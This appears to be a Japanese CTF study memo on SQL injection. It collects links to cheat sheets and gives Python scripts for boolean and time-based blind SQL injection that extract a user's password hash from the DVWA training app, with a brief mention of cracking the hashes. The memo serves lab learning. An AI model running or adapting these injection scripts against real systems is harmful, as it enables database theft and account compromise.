# SQL injection

---

---

典型コードとリンク保存

# リンク


- SQLインジェクション概要

    [猫でもわかるかもしれない SQLインジェクション](https://www.slideshare.net/kinmemodoki/sql-71064669)

- チートシート

    [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

    [MySQL SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

- 特殊文字バリデーション

    SQL injectionの問題では、どの特殊文字がバリデーションされるのかを探しだし、その解決方法を調べたものから合わせる問題が一般的となる。

    スペースがバリデーションされることもある。

    [SQL Injection without comma char](http://zoczus.blogspot.com/2013/03/sql-injection-without-comma-char.html)

- SQLの仕様・学習
    - 学習

        文法エラーになっては元も子もないので、しっかり基本は抑えていたい

        - SQL zooがよいらしい

        [SQLの基本を覚える【初心者向け】 - Qiita](https://qiita.com/chida09/items/d4b33a28b918958f267f)

        [MySQLコマンド・関数一覧（データベース）｜ITリファレンス](http://refer.it-manual.com/sql.html)

    - 仕様

        [MySQLで使いそうな物メモ - Qiita](https://qiita.com/zenpou/items/cbc116e7e6c645ec3e91)

        [MySQLで大文字小文字を区別させる](http://daybydaypg.com/2017/08/12/post-227/)

        [MySQL :: MySQL 5.7 Reference Manual :: 9.6 Comment Syntax](https://dev.mysql.com/doc/refman/5.7/en/comments.html)

        [Database File Format](https://www.sqlite.org/fileformat2.html#sqlite_master)

        　versionによるsql文変更

# CTFにおけるsqlmap利用の是非

- CTFにおいて、dirbやnmap及びsqlmapなどで必要以上の総当たり攻撃を行うツールの利用は、IPのブロックが行われる可能性がある。

    ただ、以下の記事であるように使用している人もいるので難しいところ。。。ﾜｶﾗﾅｲｯｽ

    githubのオプション見てみたら、delay optionがあったので、これで時間かけてやれば問題ないかもしれない…

    [sqlmapでTime-Based Blind SQL Injectionをやってみる - こんとろーるしーこんとろーるぶい](https://graneed.hatenablog.com/entry/2018/11/01/003456)

    [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

# Blind SQLinjection

- 普通のSQLinjectionのコードに対して、SQLのsubstrなどの関数を使い、その真偽によって情報を盗む。そのため、総当たり攻撃が必要となるので、ツール等が必須となる。
- 一般的には、コーディングをして解く、もしくはsqlmap等のツールを使う必要がある。

    **どちらも、ログインが必要な画面内で行う場合は、クッキーを設定する必要があるので注意。**

## example code

以下は,DVWAのsecurity level :lowでの　blind SQLを示す

![SQL%20injection/Untitled.png](SQL%20injection/Untitled.png)

- SQLの結果が真となる場合において、User id exists in the database.　という文字列が出現する。
- よって、このSQL文に対して、ANDで条件付けを行いパスワードの特定を行う。

まず、パスワードの文字数を特定する

```python
import requests
import sys
from tqdm import tqdm

args = sys.argv
url = args[1]

cookie ={
        "security":"low",
        "PHPSESSID":"fmn58hm2b3147eiui4oeebhrf3"
        }

for i in tqdm(range(1,100)):
    sql = '1\' and (select length(password) from users where user_id =1) ={counter};#'.format(counter =i)

    payload = {
            "id":sql ,
            "Submit" : "Submit"
    }

    response = requests.get(url,params=payload,cookies=cookie)
    if 'exists' in response.text:
        print i
    

print 'end'
```

この結果で32文字と分かり,コードづくりを行う。

次は、32文字という結果からパスワードを特定する

```python
import requests
import sys
from tqdm import tqdm

args = sys.argv
url = args[1]

cookie ={
        "security":"low",
        "PHPSESSID":"fmn58hm2b3147eiui4oeebhrf3"
        }

for index in tqdm(range(1,32)):
    for char_number in range(48,123):
        char = chr(char_number)
        sql = '1\' and substring((select password from users where user_id =1) ,{index},1)= binary \'{char}\';#'.format(index=index,char=char)

        payload = {
                "id":sql ,
                "Submit" : "Submit"
         }

        response = requests.get(url,params=payload,cookies=cookie)
        if 'exists' in response.text:
            
            print(char,end='')
            break
print("")
```

### SQLmapでの例

SQLmapでの実行例は以下を参考

[sqlmapを使ってみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2016/01/27/004356)

### DVWK(やられアプリ）

- このデータベースから取り出した値は、md5でハッシュ化されており、hascatなどで解析できる。

    [ハッシュ関数解読ツール](https://www.notion.so/47c09188b9934dd7b89aae3574794880)

# Time base blind sql Injection

- 先ほどの例では、条件が真となった場合には「User id exists in the database.」という文章が返ってきた。しかし、このような文章が返ってこない場合が存在する。この時の解決方法として、時間を使用する方法がある。

- if文を用いて、真ならsleep関数を用いて、待機時間を作る。偽なら、即レスポンスを行うという方法。真と偽のときの時差から文字を探索する。

example code

```python
import requests
import sys
import re
from tqdm import tqdm
import time

# config section #################
if(len(sys.argv) <= 1):
    print('You need attacks\'s url!')
    sys.exit()

args = sys.argv
url = args[1]
cookie ={
        "security":"low",
        "PHPSESSID":"c4gctt33ospgginn5pop4re9rp"
        }

# make sure password's count ###################################
for i in tqdm(range(1,100)):
    t1 = time.time()
    sql = '1\' and if((select length(password) from users where user_id =1) ={counter},sleep(5),0);#'.format(counter =i)
    payload = {
            "id":sql ,
            "Submit" : "Submit"
    }
   
    response = requests.get(url,params=payload,cookies=cookie) 
    t2 = time.time()
    elapsed_time = t2-t1
    if elapsed_time > 5:
        break
# make sure password ################################
print('password\'s word length: {count}'.format(count=i))
for index in tqdm(range(1,i)):
    for char_number in range(48,123):
        t1 = time.time()
        char = chr(char_number)
        sql = '1\' and if(substring((select password from users where user_id =1) ,{index},1)= binary \'{char}\',sleep(5),0);#'.format(index=index,char=char)
        #     '1 and if (substring((select password from users where user_id =1),?mojime)1)=binary ?,sleep(5),9);#
        #      true then wait 5 seconds  else fast response
        payload = {
                "id":sql ,
                "Submit" : "Submit"
         }

        response = requests.get(url,params=payload,cookies=cookie)
        t2 = time.time()
        elapsed_time = t2-t1
        if elapsed_time > 5:
            
            print(char,end='')
            break
print("")
```

[DVWA-blind％](https://www.notion.so/DVWA-blind-bfe6f9d704be42cd93b52f04834c60e6)